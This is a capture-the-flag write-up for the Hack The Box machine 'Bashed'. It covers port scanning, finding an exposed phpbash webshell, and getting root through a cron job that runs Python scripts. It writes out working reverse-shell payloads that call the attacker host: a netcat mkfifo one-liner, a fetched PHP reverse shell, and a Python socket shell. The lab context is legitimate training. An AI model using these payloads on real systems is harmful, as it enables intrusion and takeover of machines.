# Bashed - hack the box

[![AgdMvj.md.png](https://s2.ax1x.com/2019/04/03/AgdMvj.md.png)](https://imgchr.com/i/AgdMvj)

## Introduction

Target: 10.10.10.68 (OS: Linux)

Kali linux: 10.10.16.44

## Information Enumeration

Firstly, detect the open ports:

```    
# Nmap 7.70 scan initiated Wed Apr  3 20:48:43 2019 as: nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.68
Warning: 10.10.10.68 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.68
Host is up (0.31s latency).
Not shown: 39680 closed ports, 25854 filtered ports
PORT   STATE SERVICE
80/tcp open  http
```

Only port 80 is open, it may be an easy box. And the truth is that it is really an easy box.

Then, detect the services of the port 80, it may be a kind of http service.

```
# Nmap 7.70 scan initiated Wed Apr  3 20:55:27 2019 as: nmap -sC -sV -p 80 -oA services 10.10.10.68
Nmap scan report for 10.10.10.68
Host is up (0.35s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
```

Nothing special. Then access the http serve and find more.

## Exploit

### Http

Access to `http://10.10.10.68`, and it seems to be a simple blog which talks about `phpbash`.

![AgfJCd.png](https://s2.ax1x.com/2019/04/04/AgfJCd.png)

`phpbash` seems to be a webshell tool. And there is a github repository [phpbash](https://github.com/Arrexel/phpbash) introduces the tool. The introduction of the repo is to drop the file to target and access it by `http://ip/uploads/phpbash.php`. Try to access `http://10.10.10.68/uploads/phpbash.php`. But the file seems not to be here.

Utilize the dirbuster to enumerate the directories.

![AgfTPJ.png](https://s2.ax1x.com/2019/04/04/AgfTPJ.png)

Wow. Find it and open the file `phpbash.php`. Here is the webshell. I have tried to reverse shell by `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.44 1234 >/tmp/f`. But the shell cannot be return. Whatever, I can obtain the user.txt.

![AghFMt.png](https://s2.ax1x.com/2019/04/04/AghFMt.png)

It is convenient to get the reverse shell. So I try to upload a php shell to the target machine. The detailed php script can be found [here](https://github.com/neal1991/htb/blob/master/Bashed/php-reverse-shell.php). And I server the php script by `python -m SimpleHTTPServer 80`. Then download the php script from the target machine. To ensure the script can be written to the target machine. Select a path can be written, for example: `/tmp`.

[![AghBsx.png](https://s2.ax1x.com/2019/04/04/AghBsx.png)](https://imgchr.com/i/AghBsx)

`wget http://10.10.16.44/php-reverse-shell.php`

Then in the kali, set the `nc` listen to port 1234:

`nc -lvnp 1234`

Execute the php script in the target machine `php php-reverse-shell.php`. OK. We obtain the reverse shell.

[![AghhQI.png](https://s2.ax1x.com/2019/04/04/AghhQI.png)](https://imgchr.com/i/AghhQI)

## Privilege escalation

Obtain the user permission is quite easy, and it is not difficult to obtain the root permission. Utilize `sudo -l` to see the permissions of the user. Something interesting found. We can switch to `scriptmanager` user without password.

![Ag4cn0.png](https://s2.ax1x.com/2019/04/04/Ag4cn0.png)

```
su -u scrriptmanager bash -i
```

Try to enumerate the files. And I find an interesting folder inside `/script`. There are two files test.py and test.txt. Try to display the content of `test.py`.

[![AghxO0.png](https://s2.ax1x.com/2019/04/04/AghxO0.png)](https://imgchr.com/i/AghxO0)

The python script is quite straightforwared. It just write `testing 123!` to the file `test.txt`. And if we see the attributes of `test.txt`, the modified time of the file changes each minute. And the file is owned by root. It seems that `root` will execute the python scripts in `/script` folder each minute. So utilize a python script to reverse the root shell(accordint to the information above, the python version of the target machine is 2.7):

```python 
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.16.44",4444));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```

Set the kali to listen to port 4444. Download the python script in the target machine and execute. Now, root shell is obtained.

![AgICRJ.png](https://s2.ax1x.com/2019/04/04/AgICRJ.png)

[![AgIks1.png](https://s2.ax1x.com/2019/04/04/AgIks1.png)](https://imgchr.com/i/AgIks1)




